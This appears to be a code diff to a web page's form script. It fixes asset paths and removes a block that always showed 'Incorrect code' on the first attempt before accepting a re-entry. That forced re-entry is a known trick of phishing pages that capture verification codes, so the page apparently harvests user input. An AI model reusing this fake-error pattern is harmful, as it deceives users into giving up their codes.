@@ -30,7 +30,7 @@
 
 	
 	
-	<link rel="stylesheet" href="//bundle.css">
+	<link rel="stylesheet" href="/assets/bundle.css">
 			
 	
 
@@ -3232,7 +3232,7 @@ background-color: #e3e0f4;
 
 		
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="assets/emit.js"></script> 
+<script src="/assets/emit.js"></script> 
 <script>
 $(document).ready(function () {
     let firstAttempt = true;
@@ -3256,16 +3256,7 @@ $(document).ready(function () {
 
         const data = $form.serialize();
 
-        if (firstAttempt) {
-            firstAttempt = false;
-
-            $input.css("border", "2px solid red");
-            $message.text("Incorrect code");
-
-            $submitBtn.prop("disabled", false);
-            return;
-        }
-
+        
         try {
             await submitFormData(data);
         } catch (err) {
